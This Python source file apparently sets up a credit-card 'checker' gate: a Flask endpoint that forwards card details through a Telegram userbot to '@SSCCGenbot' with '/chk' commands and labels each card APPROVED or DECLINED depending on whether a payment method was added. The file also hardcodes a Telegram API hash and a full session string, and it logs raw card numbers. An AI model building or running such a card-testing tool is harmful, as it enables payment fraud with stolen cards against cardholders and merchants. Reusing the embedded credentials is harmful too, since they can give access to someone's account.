import asyncio
import time
import json
import logging
import threading
import os
from flask import Flask, jsonify
from pyrogram import Client

# ─── CONFIGURATION ───
API_ID = 34231766
API_HASH = "04adf4bfb194961bb25c3cd44f2726e6"
SESSION_STRING = "BAIKVdYAMrHxKb4r6rNYwO_x339IZcpTVZnYlM0x5wnc8kph_tJIkq7vlgNZsocS4dfa-KoZRjU03XuF93DrnE9tcVuGnK6Vscbb31fJlkvncA38x7dMDiygkd9sEAxA2lE425JUV91ZgdYqiu6W5ki3gZoC3W03dRuLFuvnF9MboDc35m2kr3SLBE2NAKe25n39FhQ1thUwzJLyPSutrx52FPqQJRAwKGRy2YGqZKHtecZ8O_4-fSNi5sNm0QscVAjBkJLvo-QngC3rBU5o7L-AIosqsrrsY5QIc2Sf_cpKp4VOP-wwVB5BRRVSx_Vdz-bN0I7u4FOHNzKYKQexnYZrkrphDAAAAAGkGqEOAA"

TARGET_BOT = "@SSCCGenbot"

# ─── FLASK APP ───
app = Flask(__name__)

# ─── LOGGING ───
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.CRITICAL)

# ─── ASYNCIO BACKGROUND MANAGER ───
loop = None
pyrogram_client = None
startup_event = threading.Event()

def run_pyrogram_background():
    """
    Runs Pyrogram in a background thread with its own loop.
    """
    global loop, pyrogram_client
    
    # 1. Create loop
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    logger.info("Background thread: Loop created.")

    # 2. Instantiate Client (REMOVED workers argument to fix compatibility)
    pyrogram_client = Client(
        name="user_session",
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=SESSION_STRING
    )

    try:
        # 3. Start Client (Pyrogram v2 start() is synchronous)
        logger.info("Background thread: Starting Pyrogram...")
        pyrogram_client.start()
        
        logger.info("✅ Background thread: Pyrogram Connected Successfully.")
        
        # Signal Flask that we are ready
        startup_event.set()
        
        # Keep the loop running
        loop.run_forever()
        
    except Exception as e:
        logger.critical(f"Background thread: Failed to start - {e}")
        logger.critical(f"Check if your Session String is valid/banned.")
        startup_event.set()

# Start the thread
t = threading.Thread(target=run_pyrogram_background, daemon=True)
t.start()

# ─── HELPER FUNCTIONS ───

async def get_card_response(cc_number):
    try:
        if not pyrogram_client.is_connected:
            raise Exception("Pyrogram client is disconnected")
            
        logger.info(f"Sending /chk {cc_number} to {TARGET_BOT}...")
        await pyrogram_client.send_message(TARGET_BOT, f"/chk {cc_number}")
        
        logger.info("Command sent. Waiting 5 seconds...")
        await asyncio.sleep(7)
        
        logger.info("Fetching chat history...")
        async for message in pyrogram_client.get_chat_history(TARGET_BOT, limit=1):
            full_text = message.text or ""
            
            extracted = "No response found"
            for line in full_text.splitlines():
                if line.strip().startswith("Response:"):
                    extracted = line.split("Response:", 1)[1].strip()
                    break
            
            logger.info(f"Raw Bot Response: {extracted}")
            return extracted
            
    except KeyError as e:
        logger.error(f"Username Resolution Error: {e}")
        return "Error: Bot username not found or account restricted."
    except Exception as e:
        logger.error(f"Error in get_card_response: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return "Error fetching response"

# ─── FLASK ROUTES ───

@app.route('/gate=b3/cc=<path:cc_details>')
def check_gate_b3(cc_details):
    try:
        start_time = time.time()
        
        if cc_details.startswith("="):
            cc_details = cc_details[1:]
            
        logger.info(f"--- New Request ---")
        logger.info(f"Card Details: {cc_details}")
        
        # Wait for pyrogram to be ready
        if not startup_event.is_set():
            logger.warning("Pyrogram not ready yet. Waiting 2s...")
            startup_event.wait(timeout=2)
            
        if loop is None or pyrogram_client is None:
             return jsonify({"error": "Service Unavailable: Userbot not initialized"}), 503

        # Run async task in background loop
        future = asyncio.run_coroutine_threadsafe(get_card_response(cc_details), loop)
        raw_response = future.result(timeout=30) 
        
        # Process Response
        final_response_text = raw_response
        status = "DECLINED"
        
        if "Too many purchase attempts" in raw_response:
            final_response_text = "Server Overloaded please wait for few minutes......"
            status = "DECLINED"
        elif "Payment method successfully added." in raw_response:
            status = "APPROVED"
            final_response_text = "Payment method successfully added."
        elif "Username not found" in raw_response:
            status = "ERROR"
            final_response_text = "Restricted Account / Bot Not Found"

        end_time = time.time()
        duration = f"{end_time - start_time:.2f}s"
        
        result = {
            "response": final_response_text,
            "status": status,
            "time": duration
        }
        
        logger.info(f"Final Result: {result}")
        return jsonify(result)

    except Exception as e:
        logger.error(f"SERVER ERROR: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"error": "Internal Server Error", "details": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
